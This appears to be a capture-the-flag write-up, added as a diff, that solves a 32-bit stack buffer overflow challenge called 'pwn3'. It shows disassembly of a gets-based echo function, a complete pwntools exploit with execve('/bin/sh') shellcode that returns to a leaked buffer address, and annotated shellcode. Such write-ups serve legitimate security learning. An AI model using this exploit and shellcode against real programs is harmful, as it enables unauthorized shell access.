@@ -1,0 +1,93 @@
+=== Personal solution description ===
+
+These challenges are so easy we can even skip decompilation and just use the disassembly:
+
+$ objdump -d ./pwn3 -M intel
+
+---------------------------------------------------------------------------------
+	0000059d <echo>:
+	 59d:	55                   	push   ebp
+	 59e:	89 e5                	mov    ebp,esp
+	 5a0:	53                   	push   ebx
+	 5a1:	81 ec 34 01 00 00    	sub    esp,0x134
+	 5a7:	e8 f4 fe ff ff       	call   4a0 <__x86.get_pc_thunk.bx>
+	 5ac:	81 c3 20 1a 00 00    	add    ebx,0x1a20
+	 5b2:	83 ec 08             	sub    esp,0x8
+	 5b5:	8d 85 d6 fe ff ff    	lea    eax,[ebp-0x12a]                  ; printing the buffer address
+	 5bb:	50                   	push   eax
+	 5bc:	8d 83 e4 e6 ff ff    	lea    eax,[ebx-0x191c]
+	 5c2:	50                   	push   eax
+	 5c3:	e8 48 fe ff ff       	call   410 <printf@plt>
+	 5c8:	83 c4 10             	add    esp,0x10
+	 5cb:	83 ec 0c             	sub    esp,0xc
+	 5ce:	8d 85 d6 fe ff ff    	lea    eax,[ebp-0x12a]                  ; 0x12a bytes until ebp, so 0x132 bytes until ret
+	 5d4:	50                   	push   eax                              ; address of vulnerable buffer
+	 5d5:	e8 46 fe ff ff       	call   420 <gets@plt>                   ; vulnerable gets
+	 5da:	83 c4 10             	add    esp,0x10
+	 5dd:	90                   	nop
+	 5de:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
+	 5e1:	c9                   	leave  
+	 5e2:	c3                   	ret    
+
+	000005e3 <main>:
+	 5e3:	8d 4c 24 04          	lea    ecx,[esp+0x4]
+	 5e7:	83 e4 f0             	and    esp,0xfffffff0
+	 5ea:	ff 71 fc             	push   DWORD PTR [ecx-0x4]
+	 5ed:	55                   	push   ebp
+	 5ee:	89 e5                	mov    ebp,esp
+	 5f0:	53                   	push   ebx
+	 5f1:	51                   	push   ecx
+	 5f2:	e8 32 00 00 00       	call   629 <__x86.get_pc_thunk.ax>
+	 5f7:	05 d5 19 00 00       	add    eax,0x19d5
+	 5fc:	8b 90 28 00 00 00    	mov    edx,DWORD PTR [eax+0x28]
+	 602:	8b 12                	mov    edx,DWORD PTR [edx]
+	 604:	6a 00                	push   0x0
+	 606:	6a 00                	push   0x0
+	 608:	6a 02                	push   0x2
+	 60a:	52                   	push   edx
+	 60b:	89 c3                	mov    ebx,eax
+	 60d:	e8 2e fe ff ff       	call   440 <setvbuf@plt>
+	 612:	83 c4 10             	add    esp,0x10
+	 615:	e8 83 ff ff ff       	call   59d <echo>
+	 61a:	b8 00 00 00 00       	mov    eax,0x0
+	 61f:	8d 65 f8             	lea    esp,[ebp-0x8]
+	 622:	59                   	pop    ecx
+	 623:	5b                   	pop    ebx
+	 624:	5d                   	pop    ebp
+	 625:	8d 61 fc             	lea    esp,[ecx-0x4]
+	 628:	c3                   	ret    
+---------------------------------------------------------------------------------
+
+
+So, here's the exploit:
+---------------------------------------------------------------------------------
+	#!/usr/bin/env python3
+	from pwn import *
+
+	target = process("./pwn3")
+	target.recvuntil(b"Take this, you might need it on your journey ")
+	jmp_addr = int(target.recvline().rstrip(b"!\n"), 16)
+
+	payload = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80"
+	payload += b"A" * (0x12e - len(payload))
+	payload += p32(jmp_addr)
+
+	target.send(payload)
+	target.interactive()
+---------------------------------------------------------------------------------
+
+Interesting to notice the shellcode. Syscall number for execve is 11, which is 0x0b in shellcode. This translates to a Vertical Tab in ASCII, which will stop the "gets" function from parsing. 
+To work around this, we need to get the number 11 without writing it:
+---------------------------------------------------------------------------------
+_start:
+    xor    eax,eax
+    push   eax
+    push   0x68732f2f
+    push   0x6e69622f
+    mov    ebx,esp
+    xor    ecx,ecx
+    xor    edx,edx
+    mov    al,0xf             ; 0x0f - 0x04 = 0x0b
+    sub    al,4
+    int    0x80
+---------------------------------------------------------------------------------
